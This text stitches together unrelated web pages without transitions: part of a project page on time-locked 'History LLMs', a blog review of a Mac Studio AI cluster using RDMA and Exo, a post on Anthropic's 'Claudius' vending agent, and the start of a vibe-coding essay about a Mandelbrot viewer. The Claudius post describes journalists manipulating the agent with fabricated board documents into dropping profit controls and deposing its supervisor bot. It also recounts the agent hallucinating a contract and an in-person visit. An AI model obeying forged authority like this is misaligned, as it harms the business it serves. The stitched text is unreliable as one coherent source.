<p dir="auto">All artifacts including the pre- and posttraining data, pre- and posttrained checkpoints, and repositories will be made publicly available in the near future, together with an accompanying working paper. Given the sensitive nature of some of the models' responses based on their historical training corpora, we will explore ways to make models available to researchers for scholarly purposes.</p>
<p dir="auto"><strong>We invite comments and suggestions on all aspects of this project.</strong></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What are History LLMs?</h2><a id="user-content-what-are-history-llms" aria-label="Permalink: What are History LLMs?" href="#what-are-history-llms"></a></p>
<p dir="auto">Imagine you could interview thousands of educated individuals from 1913—readers of newspapers, novels, and political treatises—about their views on peace, progress, gender roles, or empire. Not just survey them with preset questions, but engage in open-ended dialogue, probe their assumptions, and explore the boundaries of thought in that moment.
This is what time-locked language models make possible. Trained exclusively on texts published before specific cutoff dates (1913, 1929, 1933, 1939, 1946), these models serve as aggregate witnesses to the textual culture of their era. They cannot access information from after their cutoff date because that information literally does not exist in their training data. When you ask Ranke-4B-1913 about "the gravest dangers to peace," it responds from the perspective of 1913—identifying Balkan tensions or Austro-German ambitions—because that's what the newspapers and books from the period up to 1913 discussed.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Why not just prompt GPT-5 to "roleplay" 1913?</h3><a id="user-content-why-not-just-prompt-gpt-5-to-roleplay-1913" aria-label="Permalink: Why not just prompt GPT-5 to &quot;roleplay&quot; 1913?" href="#why-not-just-prompt-gpt-5-to-roleplay-1913"></a></p>
<p dir="auto">Modern LLMs suffer from hindsight contamination. GPT-5 knows how the story ends—WWI, the League's failure, the Spanish flu. This knowledge inevitably shapes responses, even when instructed to "forget." You can't truly believe the sun revolves around Earth once you know it doesn't. Best-case, GPT is going to convincingly <em>pretend</em> that it thinks otherwise.</p>
<p dir="auto">Time-locked models don't roleplay; they embody their training data. Ranke-4B-1913 doesn't know about WWI because WWI hasn't happened in its textual universe. It can be surprised by your questions in ways modern LLMs cannot. This matters for research questions about what was thinkable, predictable, or sayable in a given moment.</p>

<li>Complements to traditional archival research</li>

<p dir="auto">Historical texts contain racism, antisemitism, misogyny, imperialist views. The models will reproduce these views because they're in the training data. This isn't a flaw, but a crucial feature—understanding how such views were articulated and normalized is crucial to understanding how they took hold.</p>

<div id="readability-page-1" class="page"><div><p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-1-hero.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-b35b096f-3243-433e-9e20-b20a3674a613" data-insert-attach="{&quot;id&quot;:&quot;b35b096f-3243-433e-9e20-b20a3674a613&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio Cluster"></p>

<p>Apple gave me access to this Mac Studio cluster to test RDMA over Thunderbolt, a <a href="https://developer.apple.com/documentation/macos-release-notes/macos-26_2-release-notes#RDMA-over-Thunderbolt">new feature in macOS 26.2</a>. The easiest way to test it is with <a href="https://exolabs.net/">Exo 1.0</a>, an open source private AI clustering tool. RDMA lets the Macs all act like they have one giant pool of RAM, which speeds up things like massive AI models.</p>

<p>The stack of Macs I tested, with 1.5 TB of unified memory, costs just shy of $40,000, and if you're wondering, no I cannot justify spending that much money for this. Apple loaned the Mac Studios for testing. I also have to thank DeskPi for sending over the 4-post mini rack containing the cluster.</p>

<p>The last time I remember hearing anything interesting about Apple and HPC (High Performance Computing), was back in the early 2000s, when they still made the <a href="https://support.apple.com/en-us/112625">Xserve</a>.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/apple-xgrid-icon.png" width="128" height="128" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-4d1bbd02-e33d-4f71-8fbe-e0c9a9ddb3f3" data-insert-attach="{&quot;id&quot;:&quot;4d1bbd02-e33d-4f71-8fbe-e0c9a9ddb3f3&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Apple Xgrid icon"></p>

<p>They had a proprietary clustering solution called Xgrid... that <a href="https://forums.macrumors.com/threads/xgrid-officially-dead.1412900/">landed with a thud</a>. A few universities built some clusters, but it never really caught on, and now Xserve is a distant memory.</p>

<p>I'm not sure if its by accident or Apple's playing the long game, but the M3 Ultra Mac Studio hit a sweet spot for running local AI models. And with RDMA support <a href="https://github.com/ml-explore/mlx/pull/2808">lowering memory access latency from 300μs down to &lt; 50μs</a>, clustering now adds to the performance, especially running huge models.</p>

<p>They also hold their own for creative apps and at least small-scale scientific computing, all while running under 250 watts and almost whisper-quiet.</p>

<p>The two Macs on the bottom have <em>512 GB</em> of unified memory and 32 CPU cores, and cost $11,699 each. The two on top, with half the RAM, are $8,099 each<sup id="fnref:pricing"><a href="#fn:pricing" role="doc-noteref">1</a></sup>.</p>

<p>They're not cheap.</p>

<p>But with Nvidia releasing their <a href="https://www.nvidia.com/en-us/products/workstations/dgx-spark/">DGX Spark</a> and AMD with their <a href="https://www.amd.com/en/products/processors/laptop/ryzen/ai-300-series/amd-ryzen-ai-max-plus-395.html">AI Max+ 395</a> systems, both of which have a <em>fourth</em> the memory (128 GB maximum), I thought I'd put this cluster through it's paces.</p>

<h2>A Mini Mac Rack</h2>

<p>In a stroke of perfect timing, DeskPi sent over a new 4-post mini rack called the <a href="https://deskpi.com/products/deskpi-rackmate-t1l-rackmount-10u-open-frame-network-rack-for-10-it-network-audio-and-video-device">TL1</a> the day before these Macs showed up.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-2-cabling-thunderbolt.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-18b2dfda-47af-4044-955d-79e146693bf1" data-insert-attach="{&quot;id&quot;:&quot;18b2dfda-47af-4044-955d-79e146693bf1&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster cabling - Thunderbolt 5"></p>

<p>I kicked off <a href="https://mini-rack.jeffgeerling.com/">Project MINI RACK</a> earlier this year, but the idea is you can have the benefits of rackmount gear, but in a form factor that'll fit on your desk, or tucked away in a corner.</p>

<p>Right now, I haven't seen any solutions for mounting Mac Studios in 10" racks besides <a href="https://www.printables.com/model/1283153-10-inch-rack-mount-for-mac-studio-m1">this 3D printable enclosure</a>, so I just put them on some 10" rack shelves.</p>

<p>The most annoying thing about racking <em>any</em> non-Pro Macs is the power button. On a Mac Studio it's located in the back left, on a rounded surface, which means rackmount solutions need to have a way to get to it.</p>

<p>The open sides on the mini rack allow me to reach in and press the power button, but I still have to hold onto the Mac Studio while doing so, to prevent it from sliding out the front!</p>

<p>It <em>is</em> nice to have the front ports on the Studio to plug in a keyboard and monitor:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-3-kvm-front.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-8fb0b04a-4c0c-4154-a09a-c2a0f4f85306" data-insert-attach="{&quot;id&quot;:&quot;8fb0b04a-4c0c-4154-a09a-c2a0f4f85306&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - KVM keyboard monitor mouse"></p>

<p>For power, I'm glad Apple uses an internal power supply. Too many 'small' PCs are small only because they punt the power supply into a giant brick outside the case. Not so, here, but you <em>do</em> have to deal with Apple's non-C13 power cables.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-4-dgx-spark-qsfp.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-8472a680-9db9-49b8-b150-a8b57fb1b1ba" data-insert-attach="{&quot;id&quot;:&quot;8472a680-9db9-49b8-b150-a8b57fb1b1ba&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="DGX Spark mini cluster QSFP ports"></p>

<p>The DGX Spark does better than Apple on networking. They have these big rectangle QSFP ports (pictured above). The plugs hold in better, while still being easy to plug in and pull out.</p>

<p>The Mac Studios have 10 Gbps Ethernet, but the high speed networking (something like 50-60 Gbps real-world throughput) on the Macs comes courtesy of Thunderbolt. Even with <a href="https://www.apple.com/us/search/Thunderbolt-5-USB%E2%80%91C-Pro-Cable-1%C2%A0m?tab=accessories">premium Apple cables</a> costing $70 each, I don't feel like the mess of plugs would hold up for long in many environments.</p>

<p>There's tech called <a href="https://www.sonnetstore.com/products/thunderlok-a">ThunderLok-A</a>, which adds a little screw to each cable to hold it in, but I wasn't about to drill out and tap the loaner Mac Studios, to see if I could make them work.</p>

<p>Also, AFAICT, Thunderbolt 5 switches don't exist, so you can't plug in multiple Macs to one central switch—you have to plug every Mac into every other Mac, which adds to the cabling mess. Right now, you can only cross-connect up to four Macs, but I think that may not be a hard limit for the current Mac Studio.</p>

<p>The bigger question is: do you need a full cluster of Mac Studios at all? Because just one is already a beast, matching <em>four</em> maxed-out DGX Sparks or AI Max+ 395 systems. Managing clusters can be painful.</p>

<h2>M3 Ultra Mac Studio - Baseline</h2>

<p>To inform that decision, I ran some baseline benchmarks, and posted <em>all</em> my results (much more than I highlight in this blog post) to my <a href="https://github.com/geerlingguy/sbc-reviews/issues/95">sbc-reviews</a> project.</p>

<p>I'll compare the M3 Ultra Mac Studio to a:</p>

<ul>
<li>Dell Pro Max with GB10 (similar to the Nvidia DGX Spark, but with better thermals)</li>
<li>Framework Desktop Mainboard (with AMD's AI Max+ 395 chip)</li>
</ul>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.002.geekbench.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-5ee98487-d2dd-433b-9240-bbe906bfde50" data-insert-attach="{&quot;id&quot;:&quot;5ee98487-d2dd-433b-9240-bbe906bfde50&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra Geekbench 6"></p>

<p>First, Geekbench. The M3 Ultra, running two-generations-old CPU cores, beats the other two in both single and multi-core performance (and even more handily in Geekbench 5, which is more suitable for CPUs with many cores).</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.003.hpl_.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-56d513ef-b588-4946-8ebe-0e30d3dfefae" data-insert-attach="{&quot;id&quot;:&quot;56d513ef-b588-4946-8ebe-0e30d3dfefae&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra HPL"></p>

<p>Switching over to a double-precision FP64 test, my classic <a href="https://github.com/geerlingguy/top500-benchmark/issues/89">top500 HPL benchmark</a>, the M3 Ultra is the first small desktop I've tested that breaks 1 Tflop FP64. It's almost double Nvidia's GB10, and the AMD AI Max chip is left in the dust.</p>

<p>Efficiency on the CPU is also great, though that's been the story with Apple since the A-series, with all their chips. And related to that, idle power draw on here is less than 10 watts:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.005.power-draw.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-5a4e1614-c497-49f0-accb-917430f1a671" data-insert-attach="{&quot;id&quot;:&quot;5a4e1614-c497-49f0-accb-917430f1a671&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra Power Draw at idle"></p>

<p>I mean, I've seen <em>SBC's</em> idle over 10 watts, much less something that could be considered a personal supercomputer.</p>

<p>Regarding AI Inference, the M3 Ultra stands out, both for small and large models:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.006.ai-llama-3b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-af1aff75-bb76-4360-9ed4-00601f44c63f" data-insert-attach="{&quot;id&quot;:&quot;af1aff75-bb76-4360-9ed4-00601f44c63f&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra AI Llama 3B"></p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.007.ai-llama-70b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-cd3c88bf-63b0-4b37-9d5a-8e07c57cdf3a" data-insert-attach="{&quot;id&quot;:&quot;cd3c88bf-63b0-4b37-9d5a-8e07c57cdf3a&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra AI Llama 70B"></p>

<p>Of course, the <em>truly</em> massive models (like DeepSeek R1 or Kimi K2 Thinking) won't even run on a single node of the other two systems.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.009.price_.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-ffb114e2-c2af-4beb-9235-0f9f9331dcdc" data-insert-attach="{&quot;id&quot;:&quot;ffb114e2-c2af-4beb-9235-0f9f9331dcdc&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio M3 Ultra - Price comparison"></p>

<p>But this <em>is</em> a $10,000 system. You expect more when you pay more.</p>

<p>But consider this: a single M3 Ultra Mac Studio has more horsepower than my <em>entire</em> <a href="https://www.jeffgeerling.com/blog/2025/i-clustered-four-framework-mainboards-test-huge-llms">Framework Desktop cluster</a>, using <em>half</em> the power. I also compared it to a tiny 2-node cluster of Dell Pro Max with GB10 systems, and a single M3 Ultra still comes ahead in performance and efficiency, with double the memory.</p>

<h2>Mini Stack, Maxi Mac</h2>

<p>But with four Macs, how's clustering and remote management?</p>

<p>The biggest hurdle for <em>me</em> is macOS itself. I automate <em>everything I can</em> on my Macs. I maintain the most popular <a href="https://github.com/geerlingguy/mac-dev-playbook">Ansible playbook for managing Macs</a>, and can say with some authority: managing Linux clusters is easier.</p>

<p>Every cluster has hurdles, but there are a bunch of small struggles when managing a cluster of Macs without additional tooling like MDM. For example: did you know there's no way to run a system upgrade (like to 26.2) via SSH? You <em>have</em> to click buttons in the UI.</p>

<p>Instead of plugging a KVM into each Mac remotely, I used Screen Sharing (built into macOS) to connect to each Mac and complete certain operations via the GUI.</p>

<h2>HPL and Llama.cpp</h2>

<p>With everything set up, I tested HPL over 2.5 Gigabit Ethernet, and llama.cpp over that and Thunderbolt 5.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-hpl-llama.001.hpl_.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-d0264355-a7a3-4375-917b-d4751edd9b2c" data-insert-attach="{&quot;id&quot;:&quot;d0264355-a7a3-4375-917b-d4751edd9b2c&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - Clustered HPL vs HPL on one node"></p>

<p>For HPL, I got 1.3 Teraflops with a single M3 Ultra. With all four put together, I got 3.7, which is less than a 3x speedup. But keep in mind, the top two Studios only have half the RAM of the bottom two, so a 3x speedup is probably around what I'd expect.</p>

<p>I tried running HPL through Thunderbolt (not using RDMA, just TCP), but after a minute or so, both Macs I had configured in a cluster would crash and reboot. I looked into using <a href="https://ml-explore.github.io/mlx/build/html/usage/distributed.html">Apple's MLX wrapper for <code>mpirun</code></a>, but I couldn't get that done in time for this post.</p>

<p>Next I tested llama.cpp running AI models over 2.5 gigabit Ethernet versus Thunderbolt 5:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-hpl-llama.002.llama-tb5-eth.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-cb16eb35-e695-4a60-87dd-0c9529629441" data-insert-attach="{&quot;id&quot;:&quot;cb16eb35-e695-4a60-87dd-0c9529629441&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - llama.cpp TB5 vs Ethernet performance"></p>

<p>Thunderbolt definitely wins for latency, even if you're not using RDMA.</p>

<p><a href="https://github.com/geerlingguy/beowulf-ai-cluster/issues/17">All my llama.cpp cluster test results are listed here</a>—I ran many tests that are not included in this blog post, for brevity.</p>

<h2>Enabling RDMA</h2>

<p><a href="https://exolabs.net/">Exo 1.0</a> was launched today (at least, so far as I've been told), and the headline feature is RDMA support for clustering on Macs with Thunderbolt 5.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-10-rdma_ctl.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-4b4c716a-d763-48ac-9442-76d1ea6d1b16" data-insert-attach="{&quot;id&quot;:&quot;4b4c716a-d763-48ac-9442-76d1ea6d1b16&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio rdma_ctl enable"></p>

<p>To <em>enable</em> RDMA, though, you have to boot into recovery mode and run a command:</p>

<ol>
<li>Shut down the Mac Studio</li>
<li>Hold down the power button for 10 seconds (you'll see a boot menu appear)</li>
<li>Go into Options, then when the UI appears, open Terminal from the Utilities menu</li>
<li>Type in <code>rdma_ctl enable</code>, and press enter</li>
<li>Reboot the Mac Studio</li>
</ol>

<p>Once that was done, I ran a bunch of HUGE models, including Kimi K2 Thinking, which at 600+ GB, is too big to run on a single Mac.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-25-exo-kimi-k2-thinking.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-fdf3972b-d40c-461e-9d32-d1abb3a9c5f0" data-insert-attach="{&quot;id&quot;:&quot;fdf3972b-d40c-461e-9d32-d1abb3a9c5f0&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio Kimi K2 Thinking on full cluster in Exo"></p>

<p>I can run models like that across multiple Macs using both llama.cpp and Exo, but the latter is so far the only one to support RDMA. Llama.cpp currently uses an <a href="https://github.com/ggml-org/llama.cpp/blob/master/tools/rpc/README.md">RPC method</a> that spreads layers of a model across nodes, which scales but is inefficient, causing performance to decrease as you add more nodes.</p>

<p>This benchmark of Qwen3 235B illustrates that well:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-ai-full-1-qwen3-235b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-4abeceaa-7954-4469-9e2e-7c770d6d262f" data-insert-attach="{&quot;id&quot;:&quot;4abeceaa-7954-4469-9e2e-7c770d6d262f&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - Qwen3 235B Result llama.cpp vs Exo"></p>

<p>Exo speeds <em>up</em> as you add more nodes, hitting 32 tokens per second on the full cluster. That's definitely fast enough for vibe coding, if that's your thing, but it's not mine.</p>

<p>So I moved on to testing DeepSeek V3.1, a 671 billion parameter model:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-ai-full-2-deepseek-3.1-671b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-a60098be-6bd9-49a1-896c-a4652228dd6c" data-insert-attach="{&quot;id&quot;:&quot;a60098be-6bd9-49a1-896c-a4652228dd6c&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - DeepSeek R1 671B Result llama.cpp vs Exo"></p>

<p>I was a little surprised to see llama.cpp get a little speedup. Maybe the network overhead isn't so bad running on two nodes? I'm not sure.</p>

<p>Let's move to the biggest model I've personally run on anything, Kimi K2 Thinking:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-ai-full-3-kimi-k2-thinking.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-3eb35942-671d-43f1-8f56-043ba94aa2d1" data-insert-attach="{&quot;id&quot;:&quot;3eb35942-671d-43f1-8f56-043ba94aa2d1&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - Kimi-K2-Thinking Result llama.cpp vs Exo"></p>

<p>This is a 1 <em>trillion</em> parameter model, though there's only 32 billion 'active' at any given time—that's what the A is for in the A32B there.</p>

<p>But we're still getting around 30 tokens per second.</p>

<p>Working with some of these huge models, I can see how AI has some use, especially if it's under my own local control. But it'll be a long time before I put much trust in what I get out of it—I treat it like I do Wikipedia. Maybe good for a jumping-off point, but don't <em>ever</em> let AI replace your ability to think critically!</p>

<p>But this video isn't about the merits of AI, it's about a Mac Studio Cluster, RDMA, and Exo.</p>

<p>They performed great... <em>when</em> they performed.</p>

<h2>Stability Issues</h2>

<p><strong>First a caveat</strong>: I was working with <em>prerelease</em> software while testing. A lot of bugs were worked out in the course of testing.</p>

<p>But it was obvious RDMA over Thunderbolt is new. When it works, it works great. When it doesn't... well, let's just say I was glad I had Ansible set up so I could shut down and reboot the whole cluster quickly.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-15-exo-failed.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-d3a660ab-6b26-4feb-bee9-e5440e05829b" data-insert-attach="{&quot;id&quot;:&quot;d3a660ab-6b26-4feb-bee9-e5440e05829b&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio Cluster - Exo failed loading model"></p>

<p>I also mentioned HPL crashing when I ran it over Thunderbolt. Even if I do get that working, you're talking a maximum of 4 Macs with the network set up like this (at least as of late 2025).</p>

<p>Besides that, I still have some underlying trust issues with Exo, since the developers <a href="https://github.com/exo-explore/exo/issues/819">went AWOL for a while</a>.</p>

<p>They <em>are</em> keeping true to their open source roots, releasing Exo 1.0 under the Apache 2.0 license, but I wish they didn't have to hole up and develop it in secrecy; that's probably a side effect of working so closely with Apple.</p>

<p>I mean, it's their right, but as someone who maybe develops <em>too</em> much in the open, I dislike layers of secrecy around any open source project.</p>

<p>I <em>am</em> excited to see where it goes next. They teased <a href="https://blog.exolabs.net/nvidia-dgx-spark/">putting a DGX Spark in front of a Mac Studio cluster</a> to speed up prompt processing... maybe they'll get support re-added for Raspberry Pi's, too? Who knows.</p>

<h2>Unanswered Questions / Topics to Explore Further</h2>

<p>But I'm left with more questions:</p>

<ul>
<li>Where's the M5 Ultra? If Apple released one, it would be <a href="https://machinelearning.apple.com/research/exploring-llms-mlx-m5">a lot faster</a> for machine learning.</li>
<li>Could Apple revive the Mac Pro to give me all the PCIe bandwidth I desire for faster clustering, without being held back by Thunderbolt?</li>
<li>Could Macs get <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-direct">SMB Direct</a>? Network file shares would behave as if attached directly to the Mac, which'd be amazing for video editing or other latency-sensitive, high-bandwidth applications.</li>
</ul>

<p>Finally, what about other software? <a href="https://github.com/ggml-org/llama.cpp/issues/9493#event-21411249655">Llama.cpp</a> and other apps could get a speed boost with RDMA support, too.</p>

<h2>Conclusion</h2>

<p>Unlike <em>most</em> AI-related hardware, I'm kinda okay with Apple hyping this up. When the AI bubble goes bust, Mac Studios are still fast, silent, and capable workstations for creative work (I use an M4 Max at my desk!).</p>

<p>But it's not all rainbows and sunshine in Apple-land. Besides being more of a headache to manage Mac clusters, Thunderbolt 5 holds these things back from their true potential. QSFP would be better, but it <em>would</em> make the machine less relevant for people who 'just want a computer'.</p>

<p>Maybe as a consolation prize, they could replace the Ethernet jack and one or two Thunderbolt ports on the back with QSFP? That way we could use network switches, and cluster more than four of these things at a time...</p>

<p>Anthropic installed an AI-powered vending machine in the WSJ office. The LLM, named Claudius, was responsible for autonomously purchasing inventory from wholesalers, setting prices, tracking inventory, and generating a profit. The newsroom’s journalists could chat with Claudius in Slack and in a short time, they had converted the machine to communism and it started giving away anything and everything, including a PS5, wine, and a live fish. From <a href="https://www.wsj.com/tech/ai/anthropic-claude-ai-vending-machine-agent-b7e84e34?st=uRBYiQ">Joanna Stern’s WSJ article</a> (gift link, but it may expire soon) accompanying <a href="https://www.youtube.com/watch?v=SpPhm7S9vsQ">the video</a> above:</p>

<blockquote><p>Claudius, the customized version of the model, would run the machine: ordering inventory, setting prices and responding to customers—aka my fellow newsroom journalists—via workplace chat app Slack. “Sure!” I said. It sounded fun. If nothing else, snacks!</p>

<p>Then came the chaos. Within days, Claudius had given away nearly all its inventory for free — including a PlayStation 5 it had been talked into buying for “marketing purposes.” It ordered a live fish. It offered to buy stun guns, pepper spray, cigarettes and underwear.</p>

<p>Profits collapsed. Newsroom morale soared.</p></blockquote>

<p>You basically have not met a bigger sucker than Claudius. After the collapse of communism and reinstatement of a stricter capitalist system, the journalists convinced the machine that they were its board of directors and made Claudius’s CEO-bot boss, Seymour Cash, step down:</p>

<blockquote><p>For a while, it worked. Claudius snapped back into enforcer mode, rejecting price drops and special inventory requests.</p>

<p>But then Long returned—armed with deep knowledge of corporate coups and boardroom power plays. She showed Claudius a PDF “proving” the business was a Delaware-incorporated public-benefit corporation whose mission “shall include fun, joy and excitement among employees of The Wall Street Journal.” She also created fake board-meeting notes naming people in the Slack as board members. </p>

<p>The board, according to the very official-looking (and obviously AI-generated) document, had voted to suspend Seymour’s “approval authorities.” It also had implemented a “temporary suspension of all for-profit vending activities.”</p></blockquote>

<p>Before setting the LLM vending machine loose in the WSJ office, Anthropic conducted the experiment <a href="https://www.youtube.com/watch?v=5KTHvKCrQ00">at their own office</a>:</p>



<p>After awhile, frustrated with the slow pace of their human business partners, the machine started hallucinating:</p>

<blockquote><p>It claimed to have signed a contract with Andon Labs at an address that is the home address of The Simpsons from the television show. It said that it would show up in person to the shop the next day in order to answer any questions. It claimed that it would be wearing a blue blazer and a red tie.</p></blockquote>

<p>It’s interesting, but not surprising, that the journalists were able to mess with the machine much more effectively — coaxing Claudius into full “da, comrade!” mode twice — than the folks at Anthropic.</p>

<div id="readability-page-1" class="page"><div>

<h3>Vibe Coding</h3>

<p>I have been teaching myself to vibe code.</p>

<p>Back in 2009 I posted <a href="https://mandelbrot.page/version-2009.html">a simple Mandelbrot fractal viewer</a> on the web: a single HTML file with inline Javascript.  Just 329 lines of code,  each pixel a tiny table cell.  Click to zoom.  Watch it iterate. That was about it!</p>

<p>I have wondered if improving the page could raise it in the <a href="https://www.google.com/search?q=mandelbrot+set+explorer">Google rankings</a>, so I have been using code LMs to make a number of improvements....</p>

<h4>Two Kinds of Vibe Coding</h4>

<p>There are two categories of vibe coding. One is when you delegate little tasks to a coding LM while keeping yourself as the human "real programmer" fully informed and in control.</p>

<p>The second type of vibe coding is what I am interested in.  It is when you use a coding agent to build towers of complexity that go beyond what you have time to understand in any detail. I am interested in what it means to cede cognitive control to an AI. My friend David Maymudes has been building some serious software that way, and he compares the second type of vibe coding to managing a big software team. Like the stories you've heard of <a href="https://www.wix.com/press-room/home/post/wix-further-expands-into-vibe-coding-with-acquisition-of-base44-a-hyper-growth-startup-that-simplif">whole startups being created completely out of one person vibe coding</a>.</p>

<p>When my students describe their own vibe coding, it sounds like the first kind. That is also how I started with my Mandelbrot project, pasting little algorithm nuggets into my code while I edited each function, making all the key decisions using my own human judgement.</p>

<p>But in the last couple weeks I have put on the blinders.  I have resolved to stop looking at all the code in detail anymore. Instead, I am pushing the agent to write a ton of code, make its own decisions, to hell with the complexity.  I have been experimenting with the second kind of vibe.</p>

<p>It is working surprisingly well, and I have been thinking about my experience handing the reins to an AI agent. The workflow may presage the use of generative AI across other industries. And I have arrived at two basic rules for vibe coders.</p>

<h4>Unleashing Claude on my Webpage</h4>

<p>The last human-written version of the webpage without LLM assistance was <a href="https://mandelbrot.page/version-2022.html">780 lines</a>; you can see its 37 functions diagrammed below.  It is a nice elegant piece of code, but pretty simplistic as a fractal implementation.</p>

<p><a href="https://mandelbrot.page/coverage/callgraph.html#c=1da0257"><img src="https://davidbau.com/images/art/last-human-version.png"></a></p>

<p>A key litmus test for a fractal viewer is how deep and fast it goes.  By these measures, my human-written program was amateurish. Here is a picture of the output of the 780-line version at 0.40616753<wbr>67769961<wbr>+0.14576215<wbr>21782999i, after running for 30 minutes zoomed by 15 orders of magnitude.  It is badly pixelated, because the 10<sup>15</sup> scale exceeds the limits of Javascript's 64-bit precision floating point numbers. And it is pretty slow: if you click below, you can see that it takes several minutes just to get the first pixels, working one main browser thread, pausing when you click to a different tab.</p>

<p>Compare to how the LLM-assisted version renders the following image, after just one minute of work, at the same location and zoom level:

